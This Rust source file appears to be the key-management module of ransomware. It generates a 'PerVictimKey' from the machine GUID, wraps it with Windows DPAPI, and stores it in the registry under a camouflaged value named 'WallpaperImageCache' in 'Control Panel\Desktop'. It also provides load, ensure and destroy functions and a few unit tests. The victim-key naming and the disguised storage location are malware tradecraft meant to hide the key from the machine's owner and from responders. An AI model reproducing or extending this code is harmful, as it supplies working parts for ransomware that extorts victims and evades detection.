use std::io;

use uuid::Uuid;
use windows::Win32::Security::Cryptography::CRYPTPROTECT_UI_FORBIDDEN;
use windows::Win32::Security::Cryptography::{
    CryptProtectData, CryptUnprotectData, CRYPTOAPI_BLOB,
};
use windows::Win32::System::Memory::LocalFree;
use winreg::enums::*;
use winreg::RegKey;
use zeroize::Zeroize;

use crate::cipher::PerVictimKey;

#[derive(thiserror::Error, Debug)]
pub enum LoadKeyError {
    #[error("failed to open key")]
    RegistryIoError(#[from] io::Error),
    #[error("key does not exist")]
    KeyDoesNotExist,
    #[error("invalid saved key")]
    InvalidKey(#[from] windows::core::Error),
    #[error("tampered saved key")]
    TamperedKey,
}

#[derive(thiserror::Error, Debug)]
pub enum GetMachineGuidError {
    #[error("failed to open registry")]
    RegistryIoError(#[from] io::Error),
    #[error("failed to parse machine GUID")]
    InvalidGuid(#[from] uuid::Error),
}

#[derive(thiserror::Error, Debug)]
pub enum GenerateKeyError {
    #[error("failed to get machine GUID")]
    GetMachineGuidError(#[from] GetMachineGuidError),
    #[error("failed to save key")]
    SaveKeyError(#[from] io::Error),
}

#[derive(thiserror::Error, Debug)]
pub enum EnsureKeyError {
    #[error("failed to load or generate key")]
    CompositeError(LoadKeyError, GenerateKeyError),
}

/// It is the caller's responsibility to zeroize the data.
fn encode_data(data: &[u8]) -> Result<Vec<u8>, windows::core::Error> {
    let blob_in = CRYPTOAPI_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as _,
    };
    let mut blob_out = CRYPTOAPI_BLOB::default();
    let mut masked: Vec<u8> = Vec::new();
    // Safety: Had to call Windows API. YOLO.
    unsafe {
        CryptProtectData(
            &blob_in,
            None,
            // TODO(riatre): Use optional entropy to further obfuscate the key?
            None,
            None,
            None,
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut blob_out,
        )
        .ok()?;
        if blob_out.pbData.is_null() {
            // Should never happen.
            panic!();
        }
        masked.resize(blob_out.cbData as usize, 0);
        std::ptr::copy_nonoverlapping(
            blob_out.pbData,
            masked.as_mut_ptr(),
            blob_out.cbData as usize,
        );
        LocalFree(blob_out.pbData as _);
    }
    Ok(masked)
}

fn decode_data(encoded: &[u8]) -> Result<Vec<u8>, windows::core::Error> {
    let blob_in = CRYPTOAPI_BLOB {
        cbData: encoded.len() as u32,
        pbData: encoded.as_ptr() as _,
    };
    let mut blob_out = CRYPTOAPI_BLOB::default();
    let mut unmasked: Vec<u8> = Vec::new();
    // Safety: Had to call Windows API. YOLO.
    unsafe {
        CryptUnprotectData(
            &blob_in,
            None,
            // TODO(riatre): Use optional entropy to further obfuscate the key?
            None,
            None,
            None,
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut blob_out,
        )
        .ok()?;
        if blob_out.pbData.is_null() {
            // Should never happen.
            panic!();
        }
        unmasked.resize(blob_out.cbData as usize, 0);
        std::ptr::copy_nonoverlapping(
            blob_out.pbData,
            unmasked.as_mut_ptr(),
            blob_out.cbData as usize,
        );
        std::slice::from_raw_parts_mut(blob_out.pbData, blob_out.cbData as _).zeroize();
        LocalFree(blob_out.pbData as _);
    }
    // CryptUnprotectData is authenticated, so we can safely assume that the key is valid.
    Ok(unmasked)
}

pub fn load_key() -> Result<PerVictimKey, LoadKeyError> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let key = hkcu.open_subkey("Control Panel\\Desktop")?;
    let value = key.get_raw_value("WallpaperImageCache").map_err(|e| {
        if e.kind() == io::ErrorKind::NotFound {
            LoadKeyError::KeyDoesNotExist
        } else {
            LoadKeyError::RegistryIoError(e)
        }
    })?;
    if value.vtype != RegType::REG_BINARY {
        return Err(io::Error::new(io::ErrorKind::InvalidData, "invalid type").into());
    }
    let mut decoded = decode_data(&value.bytes)?;
    let parsed = PerVictimKey::parse(&decoded).ok_or(LoadKeyError::TamperedKey);
    decoded.zeroize();
    parsed
}

fn save_key(key: &PerVictimKey) -> Result<(), io::Error> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let regkey =
        hkcu.open_subkey_with_flags("Control Panel\\Desktop", KEY_SET_VALUE | KEY_QUERY_VALUE)?;
    let mut value = winreg::RegValue {
        vtype: REG_BINARY,
        bytes: encode_data(&key.dump())?,
    };
    let result = regkey.set_raw_value("WallpaperImageCache", &value);
    value.bytes.zeroize();
    result
}

fn get_machine_guid() -> Result<Uuid, GetMachineGuidError> {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let regkey = hklm.open_subkey("SOFTWARE\\Microsoft\\Cryptography")?;
    let value: String = regkey.get_value("MachineGuid")?;
    Ok(Uuid::try_parse(&value)?)
}

fn generate_key() -> Result<PerVictimKey, GenerateKeyError> {
    let key = PerVictimKey::generate(&get_machine_guid()?);
    save_key(&key)?;
    Ok(key)
}

pub fn ensure_key() -> Result<PerVictimKey, EnsureKeyError> {
    let result = load_key();
    if let Ok(key) = result {
        return Ok(key);
    }
    load_key().or_else(|e| generate_key().map_err(|ge| EnsureKeyError::CompositeError(e, ge)))
}

pub fn destroy_key() -> Result<(), io::Error> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let regkey = hkcu.open_subkey_with_flags("Control Panel\\Desktop", KEY_SET_VALUE)?;
    regkey.delete_value("WallpaperImageCache")?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encode_decode() {
        let test_in: Vec<u8> = vec![0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
        let test_out = decode_data(&encode_data(&test_in).unwrap()).unwrap();
        assert_eq!(test_in, test_out);
    }
    #[test]
    fn test_encode_decode_anti_tamper() {
        let test_in: Vec<u8> = vec![0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
        let mut encoded = encode_data(&test_in).unwrap();
        encoded[2] ^= 0x55;
        decode_data(&encoded).expect_err("should not decode tampered data");
    }
}
